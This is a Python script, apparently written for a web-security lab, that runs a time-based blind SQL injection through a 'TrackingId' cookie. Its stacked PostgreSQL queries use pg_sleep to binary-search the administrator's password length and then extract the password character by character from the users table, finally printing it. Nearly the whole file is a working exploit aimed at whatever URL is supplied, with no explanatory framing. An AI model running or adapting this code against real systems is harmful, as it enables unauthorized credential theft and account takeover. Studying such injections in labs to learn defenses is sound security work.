import requests
import sys
import string
import argparse
import time
from urllib.parse import quote

elapsed_time = 2

def conn_to_website(url, timeout=10) -> requests.Response:
    """Connect to the website with the given URL and payload."""
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        print(f"Connecting to {url} with timeout {timeout} seconds...")
        return requests.get(url, headers=headers, timeout=timeout)
    except requests.RequestException as e:
        print(f"Error connecting to {url}: {e}")
        sys.exit(1)

def guess_password_length(response, timeout, max_length) -> int:
    """Guess the length of the password from the user table"""
    tracking_id = response.cookies.get('TrackingId')
    low = 0
    high = max_length
    while low <= high:
        mid = (low + high) // 2
        payload0 = quote(f"'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)={mid}) THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
        payload1 = quote(f"'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)<{mid}) THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
        payload2 = quote(f"'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{mid}) THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
        response0 = requests.get(response.url, cookies={'TrackingId': tracking_id+payload0}, timeout=timeout)
        # print(f"elapsed time for length {mid}: {response0.elapsed.total_seconds()} seconds")
        response1 = requests.get(response.url, cookies={'TrackingId': tracking_id+payload1}, timeout=timeout)
        # print(f"elapsed time for length {mid}: {response1.elapsed.total_seconds()} seconds")
        response2 = requests.get(response.url, cookies={'TrackingId': tracking_id+payload2}, timeout=timeout)
        # print(f"elapsed time for length {mid}: {response2.elapsed.total_seconds()} seconds")
        if response0.status_code == 200 and response0.elapsed.total_seconds() >= elapsed_time:
            print(f"Password length is {mid}")
            return mid
        elif response1.status_code == 200 and response1.elapsed.total_seconds() >= elapsed_time:
            print(f"Password length is less than {mid}")
            high = mid - 1
        elif response2.status_code == 200 and response2.elapsed.total_seconds() >= elapsed_time:
            print(f"Password length is greater than {mid}")
            low = mid + 1


def guess_password(response, timeout, length, alphabet):
    """Guess the password character by character."""
    ret = ""
    for i in range (0, length):
        left = 0
        right = len(alphabet) - 1 
        while left <= right:
            mid = (left + right) // 2
            payload0 = quote(f"'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i+1}, 1)='{alphabet[mid]}') THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
            payload1 = quote(f"'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i+1}, 1)<'{alphabet[mid]}') THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
            payload2 = quote(f"'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i+1}, 1)>'{alphabet[mid]}') THEN pg_sleep({elapsed_time}) ELSE pg_sleep(0) END FROM users -- ")
            response0 = requests.get(response.url, cookies={'TrackingId': response.cookies.get('TrackingId') + payload0}, timeout=timeout)
            response1 = requests.get(response.url, cookies={'TrackingId': response.cookies.get('TrackingId') + payload1}, timeout=timeout)
            response2 = requests.get(response.url, cookies={'TrackingId': response.cookies.get('TrackingId') + payload2}, timeout=timeout)
            #print(f"Trying character '{alphabet[mid]}' at position {i+1}...")
            time.sleep(0.5)  # Sleep to avoid overwhelming the server with requests
            if response0.status_code == 200 and response0.elapsed.total_seconds() >= elapsed_time: 
                print(f"Found character '{alphabet[mid]}' at position {i+1}")
                ret += alphabet[mid]
                break
            elif response1.status_code == 200 and response1.elapsed.total_seconds() >= elapsed_time:
                right = mid - 1
            elif response2.status_code == 200 and response2.elapsed.total_seconds() >= elapsed_time:
                left = mid + 1

    return ret



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, required=True, help='URL of the target website')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout for requests in seconds')
    parser.add_argument('-alpha', '--alphabet', type=str, default=string.digits + string.ascii_uppercase + string.ascii_lowercase, help='Characters to use for guessing')
    parser.add_argument('-l', '--max-length', type=int, default=32, help='Maximum length of the TrackingId to guess')
    url = parser.parse_args().url
    timeout = parser.parse_args().timeout
    wordlist = parser.parse_args().alphabet
    max_length = parser.parse_args().max_length

    response = conn_to_website(url=url, timeout=timeout)
    print (f"Connected to {url} with status code {response.status_code}")
    print (f"Cookies: {response.cookies.get_dict()}")

    length = guess_password_length(response=response, timeout=timeout, max_length=max_length)
    password = guess_password(response=response, timeout=timeout, length=length, alphabet=wordlist)
    print(f"Password for administrator is: {password}")


    # print (tracking_id)

if __name__ == "__main__":
    main()